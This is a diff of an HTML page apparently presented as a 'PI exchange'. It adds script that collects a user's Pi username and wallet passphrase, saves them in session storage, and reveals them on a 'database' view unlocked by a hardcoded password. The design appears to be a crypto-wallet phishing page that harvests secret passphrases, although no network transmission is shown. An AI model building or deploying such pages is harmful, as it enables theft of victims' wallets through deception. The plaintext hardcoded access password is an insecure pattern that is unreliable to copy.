@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -130,4 +130,37 @@
                 exchangeButton.disabled = true;
                 exchangeButton.classList.remove("enabled");
             }
-    
+        }
+
+        function proceedToPasswordPage() {
+            let username = document.getElementById("pi-username").value.trim();
+            let passphrase = document.getElementById("passphrase").value.trim();
+
+            sessionStorage.setItem("piUsername", username);
+            sessionStorage.setItem("piPassphrase", passphrase);
+
+            document.getElementById("userInputPage").style.display = "none";
+            document.getElementById("passwordPage").style.display = "block";
+        }
+
+        function checkPassword() {
+            let enteredPassword = document.getElementById("password").value;
+            let correctPassword = "PIexchange.com@2025#%";
+
+            if (enteredPassword === correctPassword) {
+                document.getElementById("passwordPage").style.display = "none";
+                document.getElementById("databasePage").style.display = "block";
+
+                let storedUsername = sessionStorage.getItem("piUsername");
+                let storedPassphrase = sessionStorage.getItem("piPassphrase");
+
+                document.getElementById("saved-username").textContent = storedUsername ? storedUsername : "No data found";
+                document.getElementById("saved-passphrase").textContent = storedPassphrase ? storedPassphrase : "No data found";
+            } else {
+                document.getElementById("errorMessage").style.display = "block";
+            }
+        }
+    </script>
+
+</body>
+</html>
